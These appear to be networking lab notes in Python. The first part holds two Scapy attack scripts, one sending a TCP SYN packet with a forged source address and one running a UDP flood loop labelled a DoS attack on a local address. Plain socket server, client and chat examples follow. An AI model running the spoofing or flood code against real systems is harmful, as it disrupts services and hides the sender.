IP SPOFFING:

from scapy.all import IP, TCP, send

# Spoofed packet settings
src_ip = "1.2.3.4"  # Fake IP
dst_ip = "192.168.1.1"  # Target IP
src_port = 1234
dst_port = 80

# Create IP and TCP headers
ip_layer = IP(src=src_ip, dst=dst_ip)
tcp_layer = TCP(sport=src_port, dport=dst_port, flags="S")  # SYN flag

# Send the spoofed packet
send(ip_layer/tcp_layer, verbose=True)

print("Spoofed TCP SYN packet sent!")




DOS:
from scapy.all import IP, UDP, send
import time

target_ip = "192.168.1.1"
target_port = 80
packet_count = 1000  # Number of packets to send

print(f"Starting DoS attack on {target_ip}:{target_port}")

for i in range(packet_count):
    packet = IP(dst=target_ip) / UDP(dport=target_port)
    send(packet, verbose=False)
    print(f"Packet {i+1} sent")

print("DoS attack completed.")




SOCKET PROGRAMMING:

SERVER:

import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 8080))
server_socket.listen(1)

print("Server listening on port 8080...")

conn, addr = server_socket.accept()
print(f"Connection from {addr}")

data = conn.recv(1024).decode()
print(f"Received: {data}")

conn.send("Hello from server!".encode())

conn.close()


CLIENT:
import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("127.0.0.1", 8080))

client_socket.send("Hello from client!".encode())

response = client_socket.recv(1024).decode()
print(f"Server response: {response}")

client_socket.close()




modified server and client, to make it look like chat app:
Server:

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 12345))
server.listen(5)

print("Server is running... Waiting for connections.")

while True:
    client, addr = server.accept()
    print(f"Connected to {addr}")

    client.send(b"Welcome to the chat server! Type 'exit' to disconnect.\n")

    while True:
        message = client.recv(1024).decode().strip()
        if not message or message.lower() == "exit":
            print(f"Client {addr} disconnected.")
            client.send(b"Goodbye!\n")
            client.close()
            break
        print(f"Client: {message}")
        reply = input("You: ")  # Server replies manually
        client.send(reply.encode())


Simple Client Code

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("127.0.0.1", 12345))  # Connect to server

print(client.recv(1024).decode())  # Welcome message

while True:
    msg = input("You: ")
    client.send(msg.encode())
    if msg.lower() == "exit":
        break
    response = client.recv(1024).decode()
    print(f"Server: {response}")

client.close()



